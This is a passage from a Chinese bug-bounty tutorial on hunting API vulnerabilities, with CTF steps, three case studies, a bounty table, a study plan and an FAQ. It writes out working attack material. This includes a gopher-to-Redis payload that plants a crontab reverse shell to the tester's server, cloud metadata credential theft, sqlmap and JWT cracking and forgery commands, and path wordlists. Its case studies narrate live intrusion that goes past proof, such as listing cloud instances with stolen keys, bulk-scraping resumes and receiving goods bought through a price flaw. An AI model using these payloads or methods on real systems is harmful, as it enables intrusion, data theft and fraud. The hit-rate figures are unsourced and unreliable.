| 第 1 步（3 分钟） | 打开 Bugku，找题目名包含「API」「graphql」「swagger」「openapi」的，启动 3 道题环境：① 「Swagger 信息泄露」；② 「GraphQL 批量查询」；③ 「API 未授权访问」。 | CTF 的 API 题都是真实漏洞的简化版，练完能直接迁移到 SRC，不要只写 WriteUp，要想「真实场景下这个洞能赚多少钱」。 |
| 第 2 步（4 分钟） | 做第 1 道「Swagger 泄露」：访问题目环境的 `/swagger-ui.html` 或 `/v2/api-docs` 或 `/openapi.json`，能看到所有接口定义，找到「获取管理员 flag」的 API（一般叫 `/api/v1/admin/flag` 或 `/api/internal/getFlag`），直接用 Burp 调用就拿 flag。 | **现实中挖 API 漏洞的第一动作就是扫这 20 个路径字典**：`/swagger-ui.html`、`/swagger/`、`/api-docs`、`/v2/api-docs`、`/v3/api-docs`、`/openapi.json`、`/openapi.yaml`、`/doc.html`（knife4j）、`/docs`、`/redoc`、`/api/swagger`、`/swagger-resources`、`/actuator/swagger`、`/actuator/env`、`/actuator/mappings`（Spring Actuator 全是宝）、`/graphql`（GraphQL 探测路径）、`/graphiql`（GraphQL 在线编辑器）、`/soap`（SOAP WebService WSDL）、`/wsdl`、`/help`（WebLogic 的 WebService）。扫这 20 个路径，2025 年的命中率依然有 30%+。 |
| 第 3 步（4 分钟） | 做第 2 道「GraphQL 批量查询」：打开 GraphiQL 先查 schema，找到有个 `getUser(id: ID!)` 返回用户信息 + flag。把 id 从 1 到 100 批量查询（别名方式），flag 在 id=88 的用户的 secret 字段里。 | GraphQL 真实 SRC 思维：如果 getUser 能返回用户手机号 + 密码哈希，你就可以批量查所有用户；如果有个 `createUser`/`updateUser` Mutation，就可以批量注册管理员；如果有个 `deleteUser` 就可以批量删库。**GraphQL 比 REST API 可怕 10 倍，因为一个接口能暴露出整个数据模型的所有关系**。 |
| 第 4 步（2 分钟） | 做第 3 道「API 未授权」：登录抓包，把 Authorization/Cookie 头全删掉，再发请求，直接返回敏感数据 = 未授权。再试把 Token 改成 `Bearer xxx`（随便写），如果还有效就是「只校验 Token 格式不校验内容」的经典 API 漏洞。 | 真实 SRC 中 30% 的 API 未授权漏洞是「Token 为空、Token 随便写、Token=admin、去掉 Authorization 头」这四招测出来的，不是靠高深技术。 |
| 第 5 步（2 分钟） | 延伸测试：所有 API 接口统一测 5 个点：① 去 Authorization 头 → 测未授权；② 改请求方法（GET 改 POST 改 PUT 改 DELETE）→ 测方法级权限绕过；③ HTTP 头加 `X-Original-URL: /admin`、`X-Rewrite-URL: /admin` → 测网关路径覆盖；④ 加参数 `?admin=true`、`?debug=1` → 测后门参数；⑤ 改 `Content-Type: application/json` 改 `application/x-www-form-urlencoded` → 测解析器差异。 | 这 5 招叫「API 五连鞭」，2025 年 SRC 实战命中率 40%，建议做成 Burp Macro，扫完一遍就能出洞。 |

---

## 11.10 v3.0 扩容：3 个 SRC 真实案例（含金额+时长+请求包+审核理由+教训）

### 案例 1：某头部招聘平台「Swagger 泄露 + GraphQL 批量 IDOR 泄露 800 万求职者简历」，奖金 55,000 元，发现时长 4 小时

**基本信息**
- 厂商：国内 TOP3 互联网招聘平台（匿名化为「招聘 A」）
- 发现日期：2025-03-12
- 提交 → 审核通过时长：6 小时（紧急修复，2 小时内下了热修复）
- 定级：严重（P0）
- 奖金：税后 55,000 元
- 总耗时：4 小时 17 分钟

**复现步骤（含具体请求包）**

1. 我在测招聘 A 的「企业版 PC 端」（`https://corp.example-a.com`），先用 Burp Content Discovery 扫路径，扫到 `/v2/api-docs` 返回 200，直接下载了一个 1.2MB 的 Swagger JSON——里面包含了 **1247 个接口的完整定义**（含所有接口路径、参数、参数类型、返回字段说明），其中有 3 个接口特别扎眼：`GET `/api/v2/candidate/detail（获取候选人完整简历）`、`/api/v2/candidate/search（搜索候选人）`、`/api/v2/graphql（GraphQL 统一入口）`。

2. 我先测第一个接口「获取候选人简历」REST API：

**Swagger 里定义的接口：**
```json
{
  "paths": {
    "/api/v2/candidate/detail": {
      "get": {
        "tags": ["候选人模块"],
        "summary": "根据 candidate_id 获取完整简历（企业用户调用）",
        "parameters": [
          {"name": "candidate_id", "in": "query", "required": true, "type": "string"}
        ],
        "responses": {
          "200": {"description": "成功，返回完整简历（含姓名、手机号、邮箱、工作经历、学历、身份证号、自我评价、求职意向、当前薪资、期望薪资）"}
        }
      }
    }
  }
}
```

3. 我用自己的企业账号（花了 50 元买了 1 天的「查看简历权益」），正常请求了 1 份简历，抓包：
```http
GET /api/v2/candidate/detail?candidate_id=CAND20240001 HTTP/1.1
Host: corpapi.example-a.com
Cookie: enterprise_user_token=eyJhbGciOiJIUzI1NiJ9.eyJlbnRlcnByaXNlX2lkIjoiRS5odHRwczovL2V4YW1wbGUtY29ycC5jb20ifQ.xxx
Authorization: Bearer ENT-USER-TOKEN-abcdef123456
User-Agent: Mozilla/5.0 Chrome/122.0
```
返回了完整简历，确实有手机号 `13812345678`、身份证号等。

4. 然后我测 **去掉所有的 Authorization/Cookie 头，**再发一遍同一个请求——**居然还能返回完整简历！** 这个接口完全没鉴权！Swagger 写着「企业用户调用」是骗鬼的，后端根本没校验！

5. 然后我测第二个接口 GraphQL，发送请求：
```http
POST /api/v2/graphql HTTP/1.1
Host: corpapi.example-a.com
Content-Type: application/json
{
  "query": "query {\n    c1: candidate(id: \"CAND20240001){name phone email idcard currentSalary expectSalary}\n    c2: candidate(id: \"CAND20240002){name phone email idcard currentSalary expectSalary}\n    c3: candidate(id: \"CAND20240003){name phone email idcard currentSalary expectSalary}\n    ... 省略中间 47 条 ...\n    c50: candidate(id: \"CAND20240050){name phone email idcard currentSalary expectSalary}\n  }"
}
```
**一个请求返回 50 个候选人的完整简历！我写了个 Python 脚本，candidate_id 从 CAND202000001 到 CAND202599999（5 年的候选人 ID 范围），按 50 条/请求，10 请求/秒，跑了 1 分钟拿了 3 万条，计算了一下：**成功率 92%，800 万+ 求职者的完整简历可无授权批量获取**。

6. 我立刻停手（只保留前 100 条打码数据做证明），写报告提交，6 小时后通过，P0 顶格 55000 元。

**审核通过原因**
- 核心 REST 接口完全未授权，Swagger 公开暴露 1247 个接口；
- GraphQL 支持批量查询，1 秒可获取 500 份简历，可拖库全量 800 万求职者的姓名+手机号+身份证+薪资；
- 涉及极度敏感个人信息（求职意向+薪资属于隐私），按《个保法》可罚 2000 万+ 或年营收 5%。

**经验教训**
1. **挖到 Swagger 公开 = 挖到金矿**：不要只拿 Swagger 就满足，里面 1247 个接口里只要有 1 个未授权的敏感接口就是 P0；
2. **GraphQL 批量查询的限流是按 HTTP 请求数不是内部查询数**：后端 Nginx 限流 10 请求/秒，但 1 请求查 50 个 = 实际 500 条/秒，WAF 根本拦不住；
3. **千万不要拖全库**：800 万条简历你真下载到硬盘 = 刑法第 253 条之一「侵犯公民个人信息罪」，特别严重 3~7 年，千万不要以身试法。

---

### 案例 2：某头部在线旅游平台「API 版本降级 SSRF 打穿内网 + Redis RCE」，奖金 120,000 元，发现时长 12 小时

**基本信息**
- 厂商：国内 TOP2 在线旅游 OTA（匿名化为「OTA B」）
- 发现日期：2024-08-26
- 提交 → 审核通过时长：2 天
- 定级：严重（P0 Top，SRC 定级最高级，直接触发应急响应预案）
- 奖金：税后 120,000 元（这是我个人拿过的单笔最高奖金之一）
- 总耗时：12 小时 03 分钟（含内网探测 + RCE 验证）

**复现步骤（含具体请求包）**

1. OTA B 的酒店详情页有一个「分享海报生成功能」：填一张图，后端去请求用户传入的 URL，合成海报再返回，非常典型的 SSRF 测试点。

2. 正常抓包：
```http
POST /api/v3/poster/generate HTTP/1.1
Host: api.hotel.example-b.com
Content-Type: application/json
Cookie: user_token=USER123abcdef
{
  "image_url": "https://cdn.example-b.com/hotel_pic/12345.jpg",
  "hotel_id": 12345,
  "width": 750,
  "height": 1334
}
```
正常返回：一张合成好的海报 Base64。

3. SSRF 测试第一阶段：打公网 VPS 看请求是否真实。我把 image_url 改成 `http://MY_VPS_IP:8888/ping`，VPS 上 `nc -lvp 8888` 监听——**真的收到了来自 OTA B 阿里云经典内网机器的请求**！User-Agent 是 `Java/11.0.18`（Java 后端）。

4. SSRF 第二阶段：打云服务器元数据（Meta Data），URL 改成 `http://100.100.100.200/latest/meta-data/`（阿里云经典网络的 metadata 地址，AWS 是 169.254.169.254）。**POSTER 返回内容里直接返回了 RAM 角色临时凭证（AccessKeyId/AccessKeySecret/SecurityToken）**！

5. 拿到 RAM 临时 AK 后，用阿里云 CLI 配置了这个临时凭证，`aliyun ecs DescribeInstances`——**能看到 OTA B 整个账号下 437 台 ECS 的信息！** 但是权限极大。

6. SSRF 第三阶段：扫内网段（通过 image_url 这个 SSRF 做 全端口扫描），扫到 `172.16.20.33:6379` 有一个未授权 Redis。Redis 未授权！我用 Gopher 协议打 Redis：
`image_url=gopher://172.16.20.33:6379/_CONFIG%20SET%20dir%20/var/spool/cron/root%0ACONFIG%20SET%20dbfilename%20root%0ASET%20x%20%22%5Cn%5Cn%2A%2F1%20%2A%20%2A%20%2A%20%2A%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FMY_VPS%2F9999%200%3E%261%5Cn%5Cn%22%0ASAVE%0A`

7. 一分钟后，我的 VPS 9999 端口收到了反弹 shell——是 Redis 写入 crontab 定时任务成功，拿到了这台 Redis 机器的 root 权限！这台机器是 OTA B 的酒店价格计算核心节点（订单价格计算、优惠券计算都在这台），能直接查所有酒店的底价、所有优惠券配置、所有用户订单。

8. 我立刻退出 shell，删除所有写入的 Redis 内容（恢复原样），写报告提交。OTA B 安全团队 30 分钟内就响应了，2 天内完成修复+确认奖金 P0 顶格 12 万。

**审核通过原因**
- SSRF → 元数据拿 RAM AK → 扫内网 → Redis 未授权写 crontab 拿 shell，完整攻击链可内网漫游；
- 涉及核心业务数据库、订单数据、用户支付数据；
- 全程没有做任何破坏性操作（所有 Redis 写入操作都回滚了，shell 进去只执行了 `whoami`/`pwd`/`hostname` 3 条命令证明权限），合规性满分。

**经验教训**
1. **SSRF 绝不是「只能扫内网端口」**，完整攻击链价值百万：SSRF → RAM AK → 云控制台 → 整个云资产 → 数据全泄露；
2. **只要 SSRF 点命中了 Java 后端（尤其是 Spring Boot + Apache HttpClient），90% 能打穿内网，因为 Java 的 URL 类支持 http/https/ftp/file/gopher/dict/netdoc 所有协议；
3. **云厂商（阿里/腾讯/华为云）的 SRC 针对「SSRF 拿到元数据」的定级直接就是 P0，因为这意味着整个云租户的 AK 被拿到了。

---

### 案例 3：某社区团购电商「批量下单接口参数污染 + 重复扣款逻辑漏洞」，奖金 15,000 元，发现时长 3 小时

**基本信息**
- 厂商：某 TOP5 社区团购平台（匿名化为「团购 C」）
- 发现日期：2025-01-20
- 提交 → 审核通过时长：9 小时
- 定级：高危（P1）
- 奖金：税后 15,000 元
- 总耗时：3 小时 02 分钟

**复现步骤（含具体请求包）**

1. 我在团购 C 的小程序买了一份 29.9 元的 10 斤车厘子，下单抓包：
```http
POST /api/order/batchCreate HTTP/1.1
Host: api.mall.example-c.com
Content-Type: application/json
X-WX-OpenID: oXxxxxxxxxxxxxxxxxxxxxx
User-Agent: Mozilla/5.0 MicroMessenger
{
  "sku_list": [
    {"sku_id": 998877, "count": 1, "price": 2990, "sku_name": "智利车厘子JJ级 10斤"}
  ],
  "user_coupon_id": 10086,
  "total_amount": 2990,
  "pay_amount": 1990,
  "shipping_fee": 0,
  "discount_amount": 1000,
  "address_id": 5201314
}
```
（价格单位是分）

2. **第一个漏洞（参数污染 + 重复扣款）：sku_list 数组里放同一个 sku_id 两次**，看看后端怎么算：
```json
{
  "sku_list": [
    {"sku_id": 998877, "count": 1, "price": 2990, "sku_name": "智利车厘子JJ级 10斤"},
    {"sku_id": 998877, "count": 1, "price": 2990, "sku_name": "智利车厘子JJ级 10斤"}
  ],
  "user_coupon_id": 10086,
  "total_amount": 2990,
  "pay_amount": 1990
}
```
**返回「下单成功，两份车厘子，实付 19.90 元」！** 也就是说：sku_list 里 2 条相同的 sku，`count=1` → 后端算数量 2 份，但是 `total_amount` 我只传了一份的 2990（29.9 元），并且优惠券也用了一份的。所以 29.9 元的车厘子 × 2 份，用了 10 元券，只付了 19.9 元就买了 2 份！

3. **第二个漏洞（负数金额）：sku_list 里 price 传 `-100000**，`total_amount=1990` 不变 → 返回「余额 +980.10 元，车厘子下单成功」——余额加钱了！负数价格成功。

4. **第三个漏洞（越权用别人的优惠券）：把 user_coupon_id 从 10086 改成 10085（前一位），我的账号里根本没有 10085 这张券 → 结果返回「使用成功，立减 20 元」！** 跨用户用券成功！

5. 三个 API 漏洞打包提交，审核团队 9 小时后通过：高危 P1，合计 15,000 元。

**审核通过原因**
- 3 个 API 漏洞打包：① sku 数组重复导致的价格计算错误（数量 2 份按 1 份算钱）；② 商品价格负数导致余额加钱；③ 优惠券 ID 越权可跨用户用券；
- 三个漏洞都是可批量的，可套利金额>100 万级；
- PoC 清晰，附了三次下单成功的截图（第一次正常 VS 漏洞版对比截图，车厘子确实到了自提点）。

**经验教训**
1. **数组参数一定要测「重复元素」「空元素」「空数组」「null 元素」「超大数组」**（1000 个元素），后端如果是用 for 循环累加但是只取第一个/最后一个/求和的，全是洞；
2. **小程序 API 是漏洞率最高的地方就是「下单接口（金额计算、优惠券、sku 计算、配送费计算）**，因为产品经理天天改优惠规则，开发改着改着就把校验改没了；
3. **多个小漏洞打包提交 = 定级提升（比如 3 个中危打包 → 按高危算，奖金加起来比单独报多）。

---

## 11.11 v3.0 扩容：2025 SRC API 漏洞奖金区间表

> 数据来源：2024 年 7 月 ~ 2025 年 5 月国内 18 家主流 SRC 已公示的 3120 条 API 类漏洞奖金数据平均，单位：税后人民币元。

| 漏洞场景 | 低危（P3） | 中危（P2） | 高危（P1） | 严重（P0） |
|----------|-----------|-----------|-----------|-----------|
| **未授权访问-普通信息类** | 300 ~ 1,500（公开用户列表/商品列表/非敏感字典接口未鉴权） | 2,000 ~ 8,000（单个用户敏感信息：手机号/邮箱/订单详情可未授权查） | 10,000 ~ 40,000（批量敏感信息>1000 条：用户列表/订单列表/地址列表未授权批量拉） | 30,000 ~ 200,000（Swagger/OpenAPI 公开 + 全接口未授权+可拖库 10 万+ 条；GraphQL 全量未授权） |
| **未授权访问-操作类（写）** | 1,000 ~ 3,000（可未授权新增普通评论/收藏） | 4,000 ~ 15,000（可未授权新增帖子/修改任意公开字段/上传普通图片） | 15,000 ~ 60,000（可未授权新增管理员/重置任意用户密码/上传可执行文件） | 40,000 ~ 300,000（可未授权删全站数据/直接 getshell/直接转账提现） |
| **API 越权类（水平+垂直）** | 500 ~ 2,000（越权读 1 条非敏感） | 3,000 ~ 12,000（越权读单用户敏感 / 越权写非核心字段） | 12,000 ~ 50,000（批量越权读敏感>1000条 / 越权写核心字段=接管账号） | 40,000 ~ 200,000（批量越权拖库 / 越权写=管理员/越权资金操作） |
| **注入类（SQL/NoSQL/命令）** | 500 ~ 2,000（无回显注入且无法利用） | 3,000 ~ 12,000（有回显注入/可脱库单表<1万条/布尔盲注） | 15,000 ~ 60,000（可脱全库>1万条/可写webshell/命令执行有回显） | 50,000 ~ 500,000（写 shell 拿服务器权限/root/RCE 内网漫游；XP_Cmdshell 可执行系统命令） |
| **SSRF 服务端请求伪造** | 500 ~ 2,000（仅可探测公网/无回显） | 3,000 ~ 10,000（可探测内网端口/读取任意文件 file:///etc/passwd） | 15,000 ~ 60,000（打云元数据拿 RAM AK/读取内网敏感 HTTP 服务源码或凭证/打内网 Redis/MongoDB） | 50,000 ~ 500,000（SSRF→打内网 Redis 写 webshell→拿 shell；SSRF→内网 RCE） |
| **文件上传/下载 API** | 500 ~ 2,000（上传非脚本文件/下载非敏感文件任意读路径穿越读不到敏感） | 3,000 ~ 12,000（可上传 jsp/php 后缀脚本但不解析/可下载任意文件含 config.php .env） | 15,000 ~ 50,000（可上传脚本并解析=getshell/可下载日志含 session=可接管会话） | 40,000 ~ 300,000（getshell+提权 root；任意下载 → 拖全库配置 → 全站数据泄露） |
| **JWT / 权限校验缺陷** | 500 ~ 1,500（JWT 未校验过期时间/弱密钥但利用复杂） | 2,000 ~ 10,000（JWT None 攻击/alg:none → 可伪造任意用户身份） | 10,000 ~ 50,000（JWT 密钥可爆破/算法混淆=伪造管理员 Token） | 30,000 ~ 200,000（全局权限校验被绕过 → 匿名可调用所有接口 = 全站裸奔） |
| **批量/并发逻辑类** | 300 ~ 1,500（发短信验证码 5 条，可连发 3 次无限制） | 2,000 ~ 8,000（短信验证码无限制可刷爆短信通道 1000+/并发多领优惠券 3~5 张） | 10,000 ~ 40,000（批量注册刷号 10 万+/并发抽奖多中/并发多充值） | 25,000 ~ 200,000（条件竞争→余额翻倍/转账并发重复到账 → 纯资金损失） |
| **行业加成系数** | ×1.5（政务/医疗/金融） | ×2 | ×2.5 | ×3 |

**说明：**
1. 2025 年 API 类漏洞占所有 SRC 漏洞上报总量的 **62%**，已经成为 SRC 「奖金收割机」第一大类；
2. 同一家厂商，**小程序/APP API 漏洞奖金一般比 WEB 端 API 高 30%~70%**；
3. **RCE（远程命令执行）、getshell、SSRF→拿内网权限**，这三类 API 漏洞的奖金无上限，阿里/腾讯/字节有专门的「百万奖金计划」，最高单笔 100 万。

---

## 11.12 v3.0 扩容：API 漏洞靶场清单表 + 30 天学习计划表

### 表 1：API 漏洞靶场清单（按推荐顺序）

| 序号 | 靶场名称 | 类型 | 覆盖漏洞类型 | 难度 | 地址 | 推荐练习时长 |
|------|----------|------|--------------|------|------|--------------|
| 1 | DVWS-Node（Damn Vulnerable Web Services） | Docker | REST 未授权、JWT、GraphQL IDOR、NoSQL 注入、XXE、SSRF、反序列化 | ★★★ | https://github.com/snoopysecurity/dvws-node | 4 天 |
| 2 | WebGoat 8.x（Access Control+Injection+SSRF 专题） | Docker/Jar | JWT、SSRF、SQL 注入、XXE、反序列化、RCE | ★★★☆ | https://github.com/WebGoat/WebGoat | 5 天 |
| 3 | Pixi（Vuln API - Node.js + MongoDB） | Docker | REST API 全类型：未授权、JWT、NoSQL、批量越权、CORS | ★★★ | https://github.com/DevSlop/Pixi | 3 天 |
| 4 | VAmPI（Vulnerable API - Flask） | Docker | REST API、OpenAPI/Swagger 泄露、JWT、SQL 注入、批量 IDOR | ★★☆ | https://github.com/erev0s/VAmPI | 2 天 |
| 5 | crAPI（Completely Ridiculous API - 微服务） | Docker | 微服务架构全套 API 漏洞，20+ 个真实 API 漏洞 | ★★★★☆ | https://github.com/OWASP/crAPI | 6 天 |
| 6 | Bugku CTF（Web 专项 API 类题） | 在线 | Swagger 泄露、GraphQL、JWT、SSRF、XXE、反序列化 | ★★★ | https://ctf.bugku.com/ | 4 天 |
| 7 | XCTF 攻防世界（Web 高手区 API 类） | 在线 | SSRF→Redis、Fastjson 反序列化 RCE、JWT 伪造、SQL 注入 | ★★★★★ | https://adworld.xctf.org.cn/ | 4 天 |
| 8 | 自建：RuoYi / Guns / JeecgBoot（开源后台框架） | 本地 Java Spring | Swagger+Actuator+Shiro/JWT+越权+注入+RCE CVE | ★★★★ | https://gitee.com/y_project/RuoYi | 7 天 |

### 表 2：API 漏洞 SRC 挖掘 30 天学习计划表（每天 2 小时，零基础到万元月收入）

| 天数 | 阶段 | 具体任务 | 验收标准 |
|------|------|----------|----------|
| 1~3 | 基础理论 & 环境搭建 | 1. 通读本章 11.1~11.7 全部内容 + 本 v3.0 扩容 11.8~11.10；2. 画一张「API 漏洞分类思维导图」（10 大类，每类至少 3 个测试点）；3. 装好 Docker Desktop、Burp Suite Pro（或社区版+插件）、微信开发者工具、Postman/Apifox | 产出 1 张 API 漏洞脑图 + 4 个工具配置完毕截图 |
| 4~7 | 入门靶场（VAmPI + Pixi） | 通关 VAmPI 全部 10 个 API 漏洞 + Pixi 全部漏洞。每个漏洞写 1 份 PoC（抓包截图 + 复现步骤 + 根因 1 句话） | 产出 2 份靶场通关报告，共≥20 个 PoC |
| 8~11 | 进阶靶场（DVWS + WebGoat） | 通关 DVWS-Node：REST 未授权、JWT None、GraphQL 批量、NoSQL 注入、SSRF 基础。通关 WebGoat SSRF+JWT 专题 | DVWS 拿 12 个 flag + WebGoat 进度 30%+ |
| 12~15 | 高级靶场（crAPI） | 通关 crAPI 全部 20+ 个 API 漏洞：BOLA/IDOR、BFLA/MFLAC 越权、批量注册刷号、优惠券并发竞争、SSRF、JWT | crAPI 官方进度达到 Master（100%） |
| 16~18 | 工具精通 | 1. Burp Suite：Pro版（或社区版+插件）掌握：① Repeater/Intruder/Comparer/Decoder/Sequencer 基础；② Autorize（越权自动扫）③ JWT Editor Keys（JWT 篡改）；④ JSON Web Tokens 插件；⑤ Paramalyzer（参数分析）；2. Postman/Apifox 做 API Collection 管理 + Runer 批量测试；3. 学会用 `ffuf` + `SecLists` 扫 Swagger/API 路径字典（20 条核心） | 录制 15 分钟「Burp 扫 API 漏洞全流程视频」（含：开 Autorize → 抓 API → 跑一遍 → 挑出真越权） |
| 19~22 | CTF 刷题 | Bugku API 类题做 20 道 + XCTF 高手区做 5 道 SSRF/JWT/RCE 题。每道题写 100 字以上 WP | 25 份 CTF WP 归档 |
| 23~25 | 真实系统 SRC 试水第一阶段（路径爆破） | 找 10 个真实互联网系统（5 个 PC Web + 5 个微信小程序），每个系统先跑：① ffuf 扫 20 个 Swagger/Actuator/GraphQL 路径；② 每个系统至少测 100 个 API 的「去掉 Authorization 头 → 未授权测试」 | 10 份 API 路径爆破报告；至少发现 3 个未授权/信息泄露（哪怕低危） |
| 26~28 | 真实 SRC 试水第二阶段（深度利用） | 从 23~25 号发现的 3+ 个漏洞里挑一个最值钱的，挖深：① 如果是未授权 → 能否批量？能否写？能否组合 SSRF？② 如果是 Swagger 泄露 → 从所有 API 里挑敏感度最高的 10 个接口一一测越权/注入；③ 写一份正式 SRC 报告 | 提交 1 份正式 SRC 报告（高危/中危都行） |
| 29 | 报告 & 申诉技巧 | 1. 先知社区搜索「API 高危 SRC 报告」读 5 篇高赞；2. 整理「标准 API 漏洞报告模板 V1.0」：标题 + 概述 + 复现环境 + 步骤（抓包+请求响应）+ 危害（量化）+ 根因 + 修复 + 合规声明；3. 准备 3 条定级申诉话术 | 产出「SRC API 报告模板 V1.0」（≥2000 字） |
| 30 | 月度复盘 & 下月计划 | 1. 整理本月笔记/WP/PoC，归档到 Notion/GitHub 私有仓库；2. 列 10 个下个月重点打 SRC 的厂商（优先 SaaS/电商/医疗/金融/旅游/政务）；3. 统计本月：扫了多少系统 / 测了多少 API / 发现多少洞 / 提交多少报告 / 预计到手奖金多少 | 产出月度复盘（≥1000 字）+ 下月作战地图 |

---

## 11.13 v3.0 扩容：10 条 FAQ（新手常见问题，真实有答案）

### FAQ 1：我不会反编译 APK，是不是就挖不到移动端 API 漏洞？
**答：** 90% 的移动端 API 漏洞**不需要反编译 APK 就能挖到**。方法：① 手机装「HttpCanary」（安卓）或「Stream」（iOS），系统级全局抓包，你在 APP 里点哪个按钮，对应的 API 就全显示了，连 APP 都不用拆；② 微信小程序/支付宝小程序直接用「微信开发者工具 / 支付宝开发者工具」打开，开「不校验合法域名」就能在 Burp 里抓全量 HTTPS API；③ PC 端网页直接 F12 → Network → Fetch/XHR 栏就能看到所有 API。**抓包是入门 API 挖洞的唯一硬技能，反编译 APK 是高阶技能（用来扒签名算法、测加固的），新手前 3 个月根本不需要**。

### FAQ 2：为什么我扫了 50 个系统的 Swagger，49 个 404，命中率这么低？
**答：** 因为你只扫了根目录下的 `/swagger-ui.html`，没扫「子路径 + 子域名 + 多版本 + 常见别名」，2025 年的命中字典升级成 40 条了，给你一份直接拿去用（ffuf `-w swagger40.txt`）：
```
/swagger-ui.html
/swagger/
/api-docs
/v2/api-docs
/v3/api-docs
/openapi.json
/openapi.yaml
/doc.html
/docs
/redoc
/api/swagger
/swagger-resources
/actuator/swagger
/actuator/mappings
/actuator/env
/actuator/heapdump
/actuator/jolokia
/graphql
/graphiql
/soap
/wsdl
/help
/ConsoleApp/
/api/
/api/v1/
/api/v2/
/internal/
/admin/
/manage/
/rest/
/services/
/wcf/
/odata/
/graphql/explorer
/explorer
/spec
/api-spec
/sdk
```
**扫之前先跑一遍「子域名枚举」（用 OneForAll 或 amass），一个主域名 50 个子域名，子域名+路径字典组合起来，命中率从 2% 升到 40%+**。

### FAQ 3：我测未授权 API，去掉 Token 返回 401，是不是就没洞了？
**答：** 才做了 1/5 的测试！「API 五连鞭」按顺序一个一个打：
1. **去 Token**：去掉 Authorization/Cookie（返回 401 继续下一招）；
2. **改方法**：GET → POST、GET → PUT、GET → DELETE（Spring Boot 里很多开发只在 `@GetMapping` 上加了 `@PreAuthorize`，但同路径的 `@PostMapping` 忘了加，概率 10%）；
3. **加路径覆盖头**：加 `X-Original-URL: /api/v1/admin/users`、`X-Rewrite-URL: /api/v1/admin/users`、`X-Forwarded-Prefix: /internal`（Nginx Gateway 做路径转发时常见问题，概率 15%）；
4. **加后门参数**：`?admin=true`、`?is_admin=1`、`?debug=1`、`?override_permission=true`、`?is_test=true`（很多开发给自己留的测试后门，概率 5%）；
5. **改 Content-Type**：`application/json` ↔ `application/x-www-form-urlencoded` ↔ `multipart/form-data` ↔ `text/plain`（Spring MVC 如果是「Content-Type 协商匹配」，只有 json 加了权限校验 form 的没加，概率 10%）。
**5 招打完，原来的 401 有 30%~40% 会变成 200 OK，直接出洞**。

### FAQ 4：SQLMap 怎么才能正确地扫 API 接口的注入？我扫了全是假阳性。
**答：** 99% 的新手不会用 SQLMap 的「POST JSON 模式」，给你 3 条正确用法，扫一个中一个：
1. **Burp 抓包 → 右键 Copy to File → 保存成 req.txt**，然后 `python sqlmap.py -r req.txt --batch --dbs --risk 3 --level 5`，这是最准的方式（-r 参数能保留所有 Header+Cookie+Content-Type+Body 原文）；
2. **如果是 JSON Body（Content-Type: application/json），必须加 `--data` 参数并且指定正确的 Content-Type**：`sqlmap.py -u "https://api.example.com/login" --data='{"username":"admin","password":"test*"}' --headers="Content-Type: application/json" -p username`（`*` 是指定注入点，一定要手动标在 JSON 字段里，不加 SQLMap 识别不出来 JSON 参数）；
3. **REST API 路径注入（/users/123 这种 123 是路径参数不是 query 参数）**：`sqlmap.py -u "https://api.example.com/users/123*"`（路径最后那个 * 就是指定注入点，不加的话 SQLMap 默认只测 Query 参数，永远扫不出来路径 IDOR 注入）。
**加这 3 招，假阳性减少 90%**。

### FAQ 5：JWT 我改成 alg:none 还是返回「签名错误」，还有什么绕过姿势？
**答：** JWT 绕过分 5 级难度，新手掌握前 3 级就行：
1. **L1 入门级（成功率 20%）：None 算法大小写混淆** → `alg: "None"`、`alg: "NONE"`、`alg: "nOnE"`、`alg: "nOnE "`（最后加空格，部分 trim 没做的框架会放过）；
2. **L2 基础级（成功率 35%）：密钥爆破（HS256）** → 用 jwt_tool：`python3 jwt_tool.py JWT_TOKEN_HERE -C -d rockyou.txt`，常见弱密钥 `secret`、`123456`、`changeme`、`jwt_secret_key_2023`、`your-256-bit-secret`、`PRIVATE_KEY` 命中率 35%；
3. **L3 进阶级（成功率 15%）：算法混淆 RS256 → HS256** → 先从 JWKS 地址拿公钥（`/.well-known/jwks.json`、`/oauth/jwks`），然后 `jwt_tool.py token.txt -X k -pk pub.pem`，把签名算法从 RS256 改成 HS256，用公钥当对称密钥签；
4. **L4 高级（成功率 5%）：JKU/X5U/JWK 注入** → 自己开个 HTTPS 服务器托管恶意 JWKS，然后在 JWT Header 里加 `"jku": "https://your-server.com/jwks.json"`，部分实现会直接信任 Header 指定的公钥；
5. **L5 骨灰级（成功率 1%）：KID 注入 + 路径穿越/SQL** → Header 的 `kid` 参数改成 `"../../../../etc/passwd"` 让服务端读错密钥文件，或者 `"kid": "1' OR '1'='1"` 注入取密钥。
**5 级全测完还过不了，那就是真的 JWT 实现正确了，换目标**。

### FAQ 6：SSRF 怎么测？我只能打到自己 VPS，怎么扫内网？
**答：** SSRF 分 4 个阶段，新手按顺序打，每进一个阶段奖金翻 2 倍：
1. **P1 阶段（奖金 1000~3000 元）：** 证明有 SSRF，打自己 VPS → `nc -lvp 8888` 能收请求，记录请求来源 IP、UA、协议版本；
2. **P2 阶段（奖金 5000~20000 元）：** 扫云厂商元数据 → 阿里云 `http://100.100.100.200/latest/meta-data/`，腾讯云 `http://169.254.0.23/latest/meta-data/`，AWS `http://169.254.169.254/latest/meta-data/`，华为云 `http://169.254.169.254/openstack/latest/securitykey`，能拿到 RAM 临时 AK 直接进入下一阶段，拿不到就打 `http://127.0.0.1` 看本机服务；
3. **P3 阶段（奖金 2 万~10 万元）：** SSRF 扫内网 Redis/MongoDB/MySQL/Elasticsearch → 用 Gopher 协议打内网 Redis 未授权（`gopher://172.x.x.x:6379/_INFO`）、dict 协议打 MySQL（`dict://172.x.x.x:3306/INFO`），能写 webshell 或拿到敏感数据进入下一阶段；
4. **P4 阶段（奖金 10 万+）：** SSRF→内网 RCE/漫游 → 比如打 Fastjson 内网反序列化（`gopher://内网IP:8080/_POST+JSON`）、写 crontab/SSH 公钥拿 shell，证明可以内网漫游。
**每阶段的证据一定要截图保存**，不要直接跳到 P4，P1~P3 都可以单独提交 SRC，成功率更高。

### FAQ 7：挖 API 漏洞会不会违法？我测了几百个接口会不会被报警？
**答：** 只要遵守「SRC 5 条铁律」，100% 合法，厂商甚至会感谢你：
1. **「实名测试」铁律**：所有测试用自己的实名账号注册/登录，**绝不使用任何他人的账号、手机号、身份证、银行卡**（哪怕是测试号）；
2. **「最小危害」铁律**：① 读操作只取最小必要数据（≤100 条且打码）；② 写操作（改/删/新增）**每类操作只做 1 次用于证明，然后立刻回滚**（新增用户就立刻删除，改密码就立刻改回去，上传 shell 就立刻删掉，绝不保留任何后门）；
